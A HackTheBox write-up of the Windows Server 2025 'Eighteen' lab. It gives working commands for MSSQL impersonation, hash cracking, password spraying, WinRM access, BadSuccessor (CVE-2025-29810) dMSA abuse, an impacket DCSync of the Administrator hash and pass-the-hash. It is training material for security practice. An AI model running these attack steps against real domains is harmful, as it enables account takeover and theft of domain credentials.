---
title: "Eighteen — HackTheBox Writeup"
date: "2026-02-27"
description: "Easy Windows Server 2025 machine involving MSSQL impersonation chaining, Werkzeug PBKDF2 hash cracking, password spraying, and BadSuccessor CVE-2025-29810 dMSA abuse for Domain Admin"
tags: ['hackthebox', 'writeup', 'windows', 'active directory', 'CVE', 'mssql', 'privilege escalation']
thumbnail: ""
---

# Eighteen — HTB Labs Machine Writeup

**Difficulty:** Easy
**OS:** Windows Server 2025
**Domain:** eighteen.htb

---

## Attack Chain Summary

```
MSSQL SQL Auth (kevin) → Impersonate appdev
    → Discover Flask app source + database on disk
        → Extract Werkzeug PBKDF2-SHA256 hash → Crack
            → Password spray → adam.scott WinRM access
                → BloodHound: IT → CreateChild → OU=Staff
                    → BadSuccessor (CVE-2025-29810) dMSA abuse
                        → DCSync → Administrator NTLM hash → Root
```

---

## Phase 1: Reconnaissance

### Port Scan

| Port | Service | Version |
|------|---------|---------|
| 80/tcp | HTTP | Microsoft IIS httpd 10.0 |
| 1433/tcp | MSSQL | SQL Server 2022 16.00.1000 RTM |
| 5985/tcp | WinRM | Microsoft HTTPAPI httpd 2.0 |

All other AD ports (LDAP, Kerberos, SMB) are **filtered** from outside — only accessible internally.

---

## Phase 2: Initial Access — MSSQL Impersonation Chain

### MSSQL Authentication

Starting credentials found during web enumeration:

```
kevin:<redacted> (SQL Authentication)
```

### Impersonation Chain

```sql
-- kevin can impersonate appdev
EXECUTE AS LOGIN = 'appdev';
SELECT SYSTEM_USER; -- appdev
```

As `appdev`, access to the `financial_planner` database and disk file reads were possible. A Flask web application was discovered at `C:\inetpub\eighteen.htb\app.py`.

### Werkzeug Hash Extraction & Cracking

From the application database, a PBKDF2-SHA256 hash was extracted:

```
pbkdf2:sha256:600000$<salt>$<hash>
```

Custom Python cracker with multiprocessing against rockyou.txt:

```
[+] PASSWORD FOUND: <redacted>
```

### Password Spray → WinRM

After enumerating domain users via MSSQL RID brute force, the cracked password was sprayed:

```bash
nxc winrm 10.129.7.127 -u adam.scott -p '<redacted>'
# WINRM [+] eighteen\adam.scott:<redacted> (Pwn3d!)
```

```bash
evil-winrm -i 10.129.7.127 -u adam.scott -p '<redacted>'
```

---

## Phase 3: Privilege Escalation — BadSuccessor (CVE-2025-29810)

### BloodHound Analysis

SharpHound collection revealed the attack path:

```
adam.scott → MemberOf → IT → CreateChild → OU=Staff
```

The **IT** group has `CreateChild` permissions on `OU=Staff`, enabling creation of dMSA accounts.

### CVE-2025-29810 — dMSA Abuse

**BadSuccessor** (disclosed by Akamai, May 2025) — Any user with `CreateChild` on an OU can escalate to Domain Admin by abusing the delegated Managed Service Account (dMSA) migration feature in Windows Server 2025.

### Step 1: Ligolo Tunnel

Since LDAP/Kerberos are filtered externally, a ligolo-ng tunnel through the DC was required.

### Step 2: Create dMSA

```powershell
Import-Module .\BadSuccessor.ps1
BadSuccessor -mode exploit -Path "OU=Staff,DC=eighteen,DC=htb" \
  -Name "pwn_dmsa" -DelegatedAdmin "adam.scott" \
  -DelegateTarget "Administrator" -domain "eighteen.htb"
```

This creates a dMSA that "supersedes" the Administrator account by setting `msDS-ManagedAccountPrecededByLink`, causing the KDC to grant the dMSA all permissions of the superseded account.

### Step 3: Impacket dMSA Attack Chain

Requires **Impacket 0.14.0+** with `-dmsa` flag in `getST.py`:

```bash
# Get TGT for adam.scott
getTGT.py eighteen.htb/adam.scott:'<redacted>' -dc-ip 240.0.0.1

# Get dMSA service ticket
export KRB5CCNAME=/tmp/adam.scott.ccache
getST.py -impersonate 'pwn_dmsa$' -self -dmsa eighteen.htb/adam.scott \
  -k -no-pass -dc-ip 240.0.0.1

# DCSync with dMSA ticket
export KRB5CCNAME='pwn_dmsa$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache'
secretsdump.py -k -no-pass DC01.eighteen.htb -dc-ip 240.0.0.1 \
  -target-ip 240.0.0.1 -just-dc-user Administrator
```

### Pass-the-Hash → Root

```bash
evil-winrm -i 10.129.7.127 -u Administrator -H '<redacted>'
```

---

## Key Takeaways

1. **MSSQL Impersonation Chaining** — Always check `EXECUTE AS LOGIN` permissions. Low-privilege SQL users can impersonate higher-privilege accounts with disk access.

2. **Werkzeug PBKDF2 Hashes** — Flask/Werkzeug uses 600,000 iterations by default. Slow to crack but common passwords still fall to rockyou.txt.

3. **Password Spraying** — A single cracked web app password can unlock domain access.

4. **BadSuccessor (CVE-2025-29810)** — Critical Windows Server 2025 privesc:
   - Any user with `CreateChild` on an OU can create a dMSA superseding any account
   - `msDS-ManagedAccountPrecededByLink` tells the KDC to grant inherited privileges
   - Combined with impacket's `-dmsa` flag enables DCSync

5. **Ligolo-ng on macOS** — Use `utun[0-9]` device names and `240.0.0.1` alias. Do NOT route the target's subnet through the tunnel (routing loop).

---

## Tools Used

- `nmap` — Port scanning
- `nxc` (NetExec) — MSSQL auth, WinRM, password spraying
- `mssqlclient.py` — MSSQL interactive shell
- `evil-winrm` — WinRM shell access
- `SharpHound` / `BloodHound CE` — AD attack path analysis
- `ligolo-ng` — TCP tunneling
- `BadSuccessor.ps1` — dMSA exploitation
- `impacket 0.14.0` — getTGT, getST (-dmsa), secretsdump (DCSync)
